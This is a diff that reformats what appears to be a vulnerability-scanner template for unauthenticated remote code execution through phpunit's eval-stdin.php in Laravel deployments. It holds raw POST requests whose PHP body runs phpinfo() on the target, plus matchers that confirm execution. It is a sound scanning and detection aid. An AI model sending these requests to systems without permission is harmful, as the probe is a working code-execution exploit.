@@ -1,41 +1,46 @@
 id: Laravel-Phpunit-PreAuth-RCE
-
 info:
-  name: Laravel phpunit PreAuth RCE
   author: shifacyclewala, hackergautam
-  severity: critical
   description: A malicious actor can trigger Un authenticated Remote Code Execution
-  tags: rce,laravel,
+  name: Laravel phpunit PreAuth RCE
   reference: unknown
-
+  severity: critical
+  tags: rce,laravel,
 requests:
-  - raw:
-      - |
-        POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-        Content-Type: application/xml
+- matchers:
+  - condition: and
+    part: body
+    regex:
+    - phpinfo()
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  max-redirects: 5
+  raw:
+  - 'POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
 
-        <?php phpinfo();?>
+    Host: {{Hostname}}
 
-      - |
-        POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-        Content-Type: application/xml
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 
-        <?php phpinfo();?>
+    Content-Type: application/xml
 
 
-    redirects: true
-    max-redirects: 5
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - 'phpinfo()'
-        condition: and
-        part: body
-      - type: status
-        status:
-          - 200
+    <?php phpinfo();?>
+
+    '
+  - 'POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+    Content-Type: application/xml
+
+
+    <?php phpinfo();?>
+
+    '
+  redirects: true
